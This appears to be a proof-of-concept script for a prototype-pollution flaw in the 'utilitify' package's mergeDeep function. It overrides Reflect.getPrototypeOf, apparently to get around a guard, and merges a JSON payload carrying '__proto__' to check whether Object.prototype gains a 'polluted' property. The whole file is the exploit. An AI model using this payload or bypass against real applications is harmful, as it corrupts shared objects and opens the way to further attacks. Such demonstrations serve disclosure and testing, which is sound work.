Reflect.getPrototypeOf = () => false;
const {mergeDeep} = require('utilitify');
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
var result = mergeDeep({
    a: {
        b: {
            c: 'c',
            d: 'd'
        }
    }
}, { a: { b: JSON.parse(malicious_payload) } });
console.log({}.polluted);